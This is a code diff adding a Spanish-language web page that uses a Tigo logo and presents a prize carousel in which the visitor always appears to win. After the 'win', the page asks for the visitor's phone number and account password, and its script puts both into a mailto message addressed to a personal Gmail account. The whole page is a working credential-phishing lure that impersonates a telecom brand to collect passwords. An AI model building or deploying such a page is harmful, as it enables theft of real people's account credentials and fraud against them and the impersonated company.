@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Página de Premios</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.3/css/bulma.min.css">
+    <style>
+        /* Estilos para el carrusel */
+        #carrusel {
+            width: 100%;
+            overflow: hidden;
+            white-space: nowrap;
+            border: 2px solid #ccc;
+            border-radius: 10px;
+            position: relative;
+            margin: 20px auto;
+        }
+        .opcion {
+            display: inline-block;
+            width: 100px;
+            height: 100px;
+            line-height: 100px;
+            text-align: center;
+            font-size: 18px;
+            font-weight: bold;
+            color: white;
+            background-color: #4a4a4a;
+            margin: 0 10px;
+            border-radius: 10px;
+        }
+        #carrusel-container {
+            display: inline-block;
+            transition: transform 0.5s linear;
+        }
+    </style>
+</head>
+<body>
+    <!-- Navbar -->
+    <nav class="navbar is-primary" role="navigation" aria-label="main navigation">
+        <div class="navbar-brand">
+            <a class="navbar-item" href="#">
+                <img src="https://via.placeholder.com/150x50?text=Tigo+Logo" alt="Tigo Logo">
+            </a>
+        </div>
+
+        <div class="navbar-menu">
+            <div class="navbar-start">
+                <a class="navbar-item" href="#">
+                    Inicio
+                </a>
+                <a class="navbar-item" href="#">
+                    Productos
+                </a>
+                <a class="navbar-item" href="#">
+                    Servicios
+                </a>
+                <a class="navbar-item" href="#">
+                    Perfil
+                </a>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Cuerpo de la página -->
+    <section class="section">
+        <div class="container">
+            <h1 class="title">Carrusel de Premios</h1>
+            <div id="carrusel">
+                <div id="carrusel-container">
+                    <div class="opcion" style="background-color: #FF5733;">Recargas</div>
+                    <div class="opcion" style="background-color: #33FF57;">Internet</div>
+                    <div class="opcion" style="background-color: #3357FF;">Teléfonos</div>
+                    <div class="opcion" style="background-color: #FF33A1;">TV</div>
+                    <div class="opcion" style="background-color: #A133FF;">Termo</div>
+                    <div class="opcion" style="background-color: #33FFF5;">Camiseta</div>
+                    <div class="opcion" style="background-color: #F5FF33;">Gorra</div>
+                    <div class="opcion" style="background-color: #FF3333;">Mochila</div>
+                </div>
+            </div>
+            <button id="jugar" class="button is-primary">GANAR</button>
+        </div>
+    </section>
+
+    <!-- Sección de premio -->
+    <section class="section" id="premio-section" style="display: none;">
+        <div class="container">
+            <h2 class="title">¡Felicidades!</h2>
+            <p>Has ganado: <span id="premio-ganado"></span></p>
+            <div class="field">
+                <label class="label">Número de Teléfono</label>
+                <div class="control">
+                    <input id="telefono" class="input" type="text" placeholder="Número de Teléfono">
+                </div>
+            </div>
+            <div class="field">
+                <label class="label">Contraseña</label>
+                <div class="control">
+                    <input id="contrasena" class="input" type="password" placeholder="Contraseña">
+                </div>
+            </div>
+            <button id="enviar-correo" class="button is-success">Enviar Correo</button>
+        </div>
+    </section>
+
+    <script>
+        const premios = ["Recargas", "Internet", "Teléfonos", "TV", "Termo", "Camiseta", "Gorra", "Mochila"];
+        const carruselContainer = document.getElementById('carrusel-container');
+        const jugarBtn = document.getElementById('jugar');
+        const premioSection = document.getElementById('premio-section');
+        const premioGanado = document.getElementById('premio-ganado');
+        const telefonoInput = document.getElementById('telefono');
+        const contrasenaInput = document.getElementById('contrasena');
+        const enviarCorreoBtn = document.getElementById('enviar-correo');
+
+        let intervalo;
+        let desplazamiento = 0;
+        let jugando = false;
+
+        // Función para mover el carrusel
+        function moverCarrusel() {
+            desplazamiento += 1; // Velocidad de desplazamiento
+            if (desplazamiento >= 120 * premios.length) {
+                desplazamiento = 0; // Reinicia el desplazamiento
+            }
+            carruselContainer.style.transform = `translateX(-${desplazamiento}px)`;
+        }
+
+        // Iniciar el carrusel
+        function iniciarCarrusel() {
+            intervalo = setInterval(moverCarrusel, 10); // Mueve el carrusel cada 10ms
+            jugando = true;
+            jugarBtn.textContent = "GANAR";
+        }
+
+        // Detener el carrusel
+        function detenerCarrusel() {
+            clearInterval(intervalo);
+            jugando = false;
+
+            // Calcular el premio ganado
+            const indicePremio = Math.floor(desplazamiento / 120) % premios.length;
+            const premio = premios[indicePremio];
+            premioGanado.textContent = premio;
+            premioSection.style.display = 'block';
+            jugarBtn.textContent = "INTENTAR OTRA VEZ";
+        }
+
+        // Evento del botón "GANAR" / "INTENTAR OTRA VEZ"
+        jugarBtn.addEventListener('click', () => {
+            if (jugando) {
+                detenerCarrusel();
+            } else {
+                iniciarCarrusel();
+                premioSection.style.display = 'none';
+            }
+        });
+
+        // Evento del botón "Enviar Correo"
+        enviarCorreoBtn.addEventListener('click', () => {
+            const telefono = telefonoInput.value;
+            const contrasena = contrasenaInput.value;
+            const premio = premioGanado.textContent;
+
+            if (telefono && contrasena) {
+                const subject = `Ganador del Premio: ${premio}`;
+                const body = `Número de Teléfono: ${telefono}\nContraseña: ${contrasena}\nPremio: ${premio}`;
+                window.location.href = `mailto:theprojectboom@gmail.com?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
+            } else {
+                alert('Por favor, ingresa tu número de teléfono y contraseña.');
+            }
+        });
+
+        // Iniciar el carrusel al cargar la página
+        iniciarCarrusel();
+    </script>
+</body>
+</html>
